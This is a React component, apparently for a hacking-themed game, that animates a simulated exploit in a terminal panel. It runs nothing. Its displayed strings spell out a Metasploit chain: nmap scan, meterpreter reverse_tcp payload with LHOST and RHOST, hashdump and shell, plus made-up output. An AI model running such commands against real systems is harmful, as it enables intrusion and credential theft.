// src/components/Effects/ExploitEffect.js
import React, { useState, useEffect, useRef } from 'react';
import './Effects.css';

const ExploitEffect = ({ target = '10.0.0.5', vulnerability = 'CVE-2025-1234', onComplete }) => {
  const [output, setOutput] = useState([]);
  const [attackPhase, setAttackPhase] = useState('preparation');
  const [progress, setProgress] = useState(0);
  const outputRef = useRef(null);
  
  const exploitSteps = [
    { 
      phase: 'preparation', 
      commands: [
        `> nmap -sV ${target}`,
        `> searchsploit ${vulnerability}`,
        `> metasploit load exploit/${vulnerability.toLowerCase()}`
      ] 
    },
    { 
      phase: 'exploitation', 
      commands: [
        `> set RHOST ${target}`,
        `> set LHOST 192.168.1.100`,
        `> set PAYLOAD linux/x64/meterpreter/reverse_tcp`,
        `> exploit -j`
      ] 
    },
    { 
      phase: 'post_exploitation', 
      commands: [
        `> sessions -i 1`,
        `> getuid`,
        `> hashdump`,
        `> shell`
      ] 
    }
  ];
  
  useEffect(() => {
    let currentPhaseIndex = 0;
    let currentCommandIndex = 0;
    let isMounted = true;
    
    const processNextCommand = () => {
      if (!isMounted) return;
      
      if (currentPhaseIndex >= exploitSteps.length) {
        // Exploit terminÃ©
        setOutput(prev => [
          ...prev,
          { type: 'success', content: `[+] Exploit successful. Access gained to ${target}` },
          { type: 'command', content: '> whoami' },
          { type: 'output', content: 'root' }
        ]);
        
        setTimeout(() => {
          if (onComplete && isMounted) onComplete();
        }, 1500);
        return;
      }
      
      const currentPhase = exploitSteps[currentPhaseIndex];
      setAttackPhase(currentPhase.phase);
      
      if (currentCommandIndex >= currentPhase.commands.length) {
        // Phase terminÃ©e, passer Ã  la suivante
        currentPhaseIndex++;
        currentCommandIndex = 0;
        
        // Mettre Ã  jour la progression
        setProgress(Math.floor((currentPhaseIndex / exploitSteps.length) * 100));
        
        setTimeout(processNextCommand, 500);
        return;
      }
      
      // ExÃ©cuter la commande actuelle
      const command = currentPhase.commands[currentCommandIndex];
      setOutput(prev => [...prev, { type: 'command', content: command }]);
      
      // Scroll to bottom
      if (outputRef.current) {
        outputRef.current.scrollTop = outputRef.current.scrollHeight;
      }
      
      // Simuler le temps d'exÃ©cution de la commande
      setTimeout(() => {
        if (!isMounted) return;
        
        // GÃ©nÃ©rer une sortie rÃ©aliste pour la commande
        const commandOutput = generateOutput(command, currentPhase.phase);
        setOutput(prev => [...prev, { type: 'output', content: commandOutput }]);
        
        // Scroll to bottom
        if (outputRef.current) {
          outputRef.current.scrollTop = outputRef.current.scrollHeight;
        }
        
        // Passer Ã  la commande suivante
        currentCommandIndex++;
        setTimeout(processNextCommand, 800 + Math.random() * 1000);
      }, 500 + Math.random() * 1000);
    };
    
    // GÃ©nÃ©rer une sortie rÃ©aliste pour les commandes
    const generateOutput = (command, phase) => {
      if (command.includes('nmap')) {
        return `Starting Nmap 7.94 at ${new Date().toLocaleTimeString()}
Scanning ${target} [1000 ports]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.59
443/tcp open  https   Apache 2.4.59
8080/tcp open  http    Tomcat 9.0.74

Service detection performed. Please report any incorrect results.
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds`;
      } else if (command.includes('searchsploit')) {
        return `-------------------------------------------- ---------------------------------
 Exploit Title                          |  Path
-------------------------------------------- ---------------------------------
Apache 2.4.59 - Remote Command Execution | linux/remote/50134.py
Apache 2.4.59 - Debug Mode Privilege Esc | linux/remote/50135.rb
-------------------------------------------- ---------------------------------
2 Exploits found`;
      } else if (command.includes('metasploit')) {
        return `[*] Loading module...
[+] Module loaded successfully`;
      } else if (command.includes('set RHOST')) {
        return `RHOST => ${target}`;
      } else if (command.includes('set LHOST')) {
        return `LHOST => 192.168.1.100`;
      } else if (command.includes('set PAYLOAD')) {
        return `PAYLOAD => linux/x64/meterpreter/reverse_tcp`;
      } else if (command.includes('exploit -j')) {
        return `[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 192.168.1.100:4444 
[*] Sending stage (3012516 bytes) to ${target}
[*] Meterpreter session 1 opened`;
      } else if (command.includes('sessions -i')) {
        return `[*] Starting interaction with session 1...
meterpreter > `;
      } else if (command.includes('getuid')) {
        return `Server username: root`;
      } else if (command.includes('hashdump')) {
        return `root:$6$salt$hashedpasswordhere:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
admin:$6$salt$hashedpasswordhere:1000:1000:admin:/home/admin:/bin/bash`;
      } else if (command.includes('shell')) {
        return `Process 1234 created.
Channel 2 created.
$ `;
      }
      
      return 'Command executed successfully.';
    };
    
    // DÃ©marrer l'effet d'exploit
    setTimeout(processNextCommand, 500);
    
    return () => {
      isMounted = false;
    };
  }, [target, vulnerability, onComplete]);
  
  return (
    <div className="terminal-effect exploit-effect">
      <div className="effect-header">
        <span className="blink">ðŸ”´</span> VOID EXPLOITATION FRAMEWORK
      </div>
      <div className="effect-content">
        <div className="exploit-info">
          <div className="info-row">
            <span className="label">Target:</span> 
            <span className="value">{target}</span>
          </div>
          <div className="info-row">
            <span className="label">Vulnerability:</span> 
            <span className="value">{vulnerability}</span>
          </div>
          <div className="info-row">
            <span className="label">Phase:</span> 
            <span className="value">{attackPhase}</span>
          </div>
        </div>
        
        <div className="progress-container">
          <div className="progress-bar">
            <div className="progress" style={{ width: `${progress}%` }}></div>
          </div>
          <div className="progress-text">{progress}%</div>
        </div>
        
        <div className="console-output" ref={outputRef}>
          {output.map((line, index) => (
            <div key={index} className={`line ${line.type}`}>
              {line.content}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default ExploitEffect;